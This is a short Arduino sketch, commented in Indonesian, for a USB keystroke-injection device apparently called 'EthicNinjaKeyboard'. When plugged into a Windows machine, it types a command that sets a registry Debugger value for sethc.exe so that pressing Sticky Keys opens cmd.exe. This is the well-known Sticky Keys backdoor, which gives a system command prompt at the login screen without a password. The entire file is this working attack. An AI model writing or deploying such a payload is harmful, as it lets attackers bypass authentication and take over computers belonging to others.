#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Set shift+alt+prtscr menjadi shortcut cmd
  en.winRUN("cmd.exe /c \"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f\"");
}

void loop() {
  
}

